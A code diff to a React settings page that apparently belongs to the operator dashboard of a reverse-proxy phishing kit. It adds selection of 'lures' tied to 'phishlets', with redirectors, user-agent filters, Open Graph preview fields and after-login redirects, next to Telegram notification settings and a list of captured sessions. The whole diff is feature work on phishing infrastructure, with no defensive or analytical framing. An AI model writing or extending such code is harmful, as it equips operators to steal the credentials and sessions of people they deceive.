@@ -3,6 +3,22 @@ import { useState, useEffect } from "react";
 import { toast } from "react-hot-toast";
 import { Session } from "@/types";
 
+interface Lure {
+  hostname: string;
+  id: string;
+  info: string;
+  og_desc: string;
+  og_image: string;
+  og_title: string;
+  og_url: string;
+  path: string;
+  paused: number;
+  phishlet: string;
+  redirect_url: string;
+  redirector: string;
+  ua_filter: string;
+}
+
 export default function Settings() {
   const [settings, setSettings] = useState({
     telegramToken: "",
@@ -26,6 +42,8 @@ export default function Settings() {
   const [backupFile, setBackupFile] = useState("");
   const [showSuccess, setShowSuccess] = useState(false);
   const [error, setError] = useState<string | null>(null);
+  const [lures, setLures] = useState<Lure[]>([]);
+  const [selectedLure, setSelectedLure] = useState<Lure | null>(null);
 
   useEffect(() => {
     const fetchTelegramSettings = async () => {
@@ -79,18 +97,21 @@ export default function Settings() {
           securityResponse,
           linkResponse,
           blacklistResponse,
+          luresResponse,
         ] = await Promise.all([
           fetch("/api/telegram-settings"),
           fetch("/api/security-settings"),
           fetch("/api/link-settings"),
           fetch("/api/blacklist"),
+          fetch("/api/lures"),
         ]);
 
         if (
           !telegramResponse.ok ||
           !securityResponse.ok ||
           !linkResponse.ok ||
-          !blacklistResponse.ok
+          !blacklistResponse.ok ||
+          !luresResponse.ok
         ) {
           throw new Error("Failed to fetch settings");
         }
@@ -99,6 +120,22 @@ export default function Settings() {
         const securityData = await securityResponse.json();
         const linkData = await linkResponse.json();
         const blacklistData = await blacklistResponse.json();
+        const luresData = await luresResponse.json();
+
+        setLures(luresData.lures || []);
+
+        // Find the lure that matches the current link path
+        const currentLure = luresData.lures?.find(
+          (lure) =>
+            lure.path === `/${linkData.linkPath}` ||
+            lure.path === linkData.linkPath
+        );
+
+        if (currentLure) {
+          setSelectedLure(currentLure);
+        } else if (luresData.lures && luresData.lures.length > 0) {
+          setSelectedLure(luresData.lures[0]);
+        }
 
         setSettings((prev) => ({
           ...prev,
@@ -398,6 +435,24 @@ export default function Settings() {
     }
   };
 
+  const handleLureChange = (lureId: string) => {
+    const selected = lures.find((lure) => lure.id === lureId);
+    if (selected) {
+      setSelectedLure(selected);
+
+      // Update the link path input with the selected lure's path
+      const cleanPath = selected.path.startsWith("/")
+        ? selected.path.substring(1)
+        : selected.path;
+
+      setSettings((prev) => ({
+        ...prev,
+        linkPath: cleanPath,
+        afterLoginRedirect: selected.redirect_url || prev.afterLoginRedirect,
+      }));
+    }
+  };
+
   const filteredSessions = sessions.filter((session) => {
     const searchLower = searchQuery.toLowerCase();
     return (
@@ -591,6 +646,23 @@ export default function Settings() {
             </div>
 
             <div>
+              <label className="block text-gray-400 mb-2">Link Type</label>
+              {lures.length > 0 ? (
+                <select
+                  className="w-full bg-[#1B2028] text-white p-3 rounded mb-4"
+                  value={selectedLure?.id || ""}
+                  onChange={(e) => handleLureChange(e.target.value)}
+                >
+                  {lures.map((lure) => (
+                    <option key={lure.id} value={lure.id}>
+                      {lure.phishlet} - {lure.path}
+                    </option>
+                  ))}
+                </select>
+              ) : (
+                <p className="text-sm text-gray-500 mb-4">No lures available</p>
+              )}
+
               <label className="block text-gray-400 mb-2">Link Path</label>
               <input
                 type="text"
